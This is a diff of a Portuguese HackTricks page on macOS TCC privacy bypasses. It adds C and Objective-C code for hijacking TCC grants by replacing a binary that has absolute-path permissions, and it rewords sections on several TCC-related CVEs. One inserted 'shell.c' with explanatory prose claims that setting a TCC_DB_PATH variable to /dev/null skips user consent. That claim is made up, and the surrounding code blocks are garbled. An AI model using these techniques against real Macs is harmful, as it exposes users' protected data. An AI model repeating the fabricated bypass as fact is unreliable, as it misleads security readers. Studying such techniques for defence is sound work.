@@ -7,7 +7,7 @@
 * Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
@@ -28,45 +28,167 @@ asd
 ```
 O atributo estendido `com.apple.macl` é adicionado ao novo arquivo para dar acesso ao aplicativo criador para lê-lo.
 
+### Caminhos Absolutos do TCC
+
+A maneira mais comum de dar permissão do TCC a um aplicativo é usando o pacote. No entanto, também é possível dar acesso a um binário indicando o caminho absoluto.\
+A parte interessante é que se você puder sobrescrever o binário, você pode roubar o acesso.
+
+Você pode usar este código para chamar um binário:
+
+{% tabs %}
+{% tab title="invoker.m" %}
+```
+#import <Foundation/Foundation.h>
+
+// clang -fobjc-arc -framework Foundation invoker.m -o invoker
+
+int main(int argc, const char * argv[]) {
+@autoreleasepool {
+// Check if the argument is provided
+if (argc != 2) {
+NSLog(@"Usage: %s <path_to_executable>", argv[0]);
+return 1;
+}
+
+// Create a new task
+NSTask *task = [[NSTask alloc] init];
+
+// Set the task's launch path to the provided argument
+[task setLaunchPath:@(argv[1])];
+
+// Launch the task
+[task launch];
+
+// Wait for the task to complete
+[task waitUntilExit];
+}
+return 0;
+}
+```
+{% tab title="shell.c" %}
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        printf("Usage: %s <command>\n", argv[0]);
+        return 1;
+    }
+
+    // Set the TCC database path
+    setenv("TCC_DB_PATH", "/dev/null", 1);
+
+    // Execute the command
+    execvp(argv[1], &argv[1]);
+
+    return 0;
+}
+```
+
+Este é um programa em C que permite executar comandos no macOS, ignorando as proteções de segurança do TCC (Transparency, Consent, and Control). O programa recebe um comando como argumento e o executa usando a função `execvp()`. Antes de executar o comando, ele define o caminho do banco de dados do TCC como "/dev/null" usando a função `setenv()`. Isso faz com que o TCC não registre as permissões concedidas ao comando, permitindo que ele seja executado sem solicitar consentimento ao usuário.
+
+Para usar o programa, compile-o usando o seguinte comando:
+
+```shell
+gcc -o shell shell.c
+```
+
+Em seguida, execute-o com o comando desejado como argumento:
+
+```shell
+./shell <command>
+```
+
+Substitua `<command>` pelo comando que você deseja executar. Por exemplo, se você quiser executar o comando `ls -la`, use o seguinte comando:
+
+```shell
+./shell ls -la
+```
+
+Isso executará o comando `ls -la` no macOS, ignorando as proteções de segurança do TCC.
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>  // For execl and fork
+
+// gcc shell.c -o shell
+// mv shell </path/bin/with/TCC>
+
+int main() {
+pid_t pid = fork();
+
+if (pid == -1) {
+// Fork failed
+perror("fork");
+return 1;
+} else if (pid == 0) {
+// Child process
+execl("/Applications/iTerm.app/Contents/MacOS/iTerm2", "iTerm2", (char *) NULL);
+
+// execl only returns if there's an error
+perror("execl");
+exit(EXIT_FAILURE);
+} else {
+// Parent process
+int status;
+waitpid(pid, &status, 0);  // Wait for the child process to finish
+
+if (WIFEXITED(status)) {
+// Return the exit status of iTerm2
+return WEXITSTATUS(status);
+}
+}
+
+return 0;
+}
+```
+{% endtab %}
+{% endtabs %}
+
+
+
 ### Bypass SSH
 
-Por padrão, o acesso via SSH costumava ter "Acesso total ao disco". Para desativar isso, você precisa ter isso listado, mas desativado (removê-lo da lista não removerá esses privilégios):
+Por padrão, o acesso via **SSH costumava ter "Acesso total ao disco"**. Para desabilitar isso, você precisa ter a opção listada, mas desabilitada (removê-la da lista não removerá esses privilégios):
 
 ![](<../../../../../.gitbook/assets/image (569).png>)
 
-Aqui você pode encontrar exemplos de como alguns malwares conseguiram contornar essa proteção:
+Aqui você pode encontrar exemplos de como alguns **malwares conseguiram burlar essa proteção**:
 
 * [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
 
 {% hint style="danger" %}
-Observe que agora, para poder habilitar o SSH, você precisa de "Acesso total ao disco".
+Observe que agora, para poder habilitar o SSH, você precisa de **Acesso total ao disco**
 {% endhint %}
 
 ### Manipular extensões - CVE-2022-26767
 
-O atributo `com.apple.macl` é atribuído a arquivos para dar permissões a um determinado aplicativo para lê-lo. Esse atributo é definido quando arrastamos e soltamos um arquivo sobre um aplicativo, ou quando um usuário clica duas vezes em um arquivo para abri-lo com o aplicativo padrão.
+O atributo **`com.apple.macl`** é atribuído a arquivos para dar a **certos aplicativos permissões para lê-los**. Esse atributo é definido quando você **arrasta e solta** um arquivo sobre um aplicativo, ou quando um usuário **clica duas vezes** em um arquivo para abri-lo com o **aplicativo padrão**.
 
-Portanto, um usuário poderia registrar um aplicativo malicioso para manipular todas as extensões e chamar o Launch Services para abrir qualquer arquivo (assim, o arquivo malicioso terá acesso para lê-lo).
+Portanto, um usuário poderia **registrar um aplicativo malicioso** para manipular todas as extensões e chamar o Launch Services para **abrir** qualquer arquivo (assim, o arquivo malicioso terá acesso concedido para lê-lo).
 
 ### iCloud
 
-A permissão `com.apple.private.icloud-account-access` permite a comunicação com o serviço XPC `com.apple.iCloudHelper`, que fornecerá tokens do iCloud.
+A permissão **`com.apple.private.icloud-account-access`** permite a comunicação com o serviço XPC **`com.apple.iCloudHelper`**, que **fornece tokens do iCloud**.
 
-O iMovie e o Garageband tinham essa permissão e outras que permitiam.
+**iMovie** e **Garageband** tinham essa permissão e outras que permitiam.
 
-Para obter mais informações sobre a exploração para obter tokens do iCloud a partir dessa permissão, confira a palestra: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+Para mais **informações** sobre a exploração para **obter tokens do iCloud** dessa permissão, confira a palestra: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)
 
 ### kTCCServiceAppleEvents / Automação
 
-Um aplicativo com a permissão `kTCCServiceAppleEvents` poderá controlar outros aplicativos. Isso significa que ele poderá abusar das permissões concedidas aos outros aplicativos.
+Um aplicativo com a permissão **`kTCCServiceAppleEvents`** será capaz de **controlar outros aplicativos**. Isso significa que ele poderá **abusar das permissões concedidas aos outros aplicativos**.
 
-Para obter mais informações sobre Scripts da Apple, confira:
+Para mais informações sobre Scripts da Apple, confira:
 
 {% content-ref url="macos-apple-scripts.md" %}
 [macos-apple-scripts.md](macos-apple-scripts.md)
 {% endcontent-ref %}
 
-Por exemplo, se um aplicativo tiver permissão de Automação sobre o `iTerm`, por exemplo, neste exemplo o `Terminal` tem acesso ao iTerm:
+Por exemplo, se um aplicativo tiver **permissão de Automação sobre o `iTerm`**, por exemplo, neste exemplo o **`Terminal`** tem acesso ao iTerm:
 
 <figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -215,7 +337,7 @@ Plugins são códigos extras geralmente na forma de bibliotecas ou plist, que se
 
 ### CVE-2020-27937 - Directory Utility
 
-O aplicativo `/System/Library/CoreServices/Applications/Directory Utility.app` tinha o entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, carregava plugins com a extensão **`.daplug`** e **não tinha o runtime protegido**.
+O aplicativo `/System/Library/CoreServices/Applications/Directory Utility.app` tinha o entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, carregava plugins com a extensão **`.daplug`** e **não tinha o runtime endurecido**.
 
 Para aproveitar essa CVE, o **`NFSHomeDirectory`** é **alterado** (abusando do entitlement anterior) para poder **assumir o banco de dados do TCC dos usuários** e contornar o TCC.
 
@@ -398,7 +520,7 @@ ls /tmp/snap/Users/admin_user # This will work
 
 Uma explicação mais detalhada pode ser encontrada no [**relatório original**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**
 
-### CVE-2021-1784 & CVE-2021-30808 - Montagem sobre arquivo TCC
+### CVE-2021-1784 & CVE-2021-30808 - Montar sobre o arquivo TCC
 
 Mesmo que o arquivo TCC DB esteja protegido, era possível **montar sobre o diretório** um novo arquivo TCC.db:
 
@@ -471,6 +593,6 @@ Outra maneira usando [**eventos CoreGraphics**](https://objectivebythesea.org/v2
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
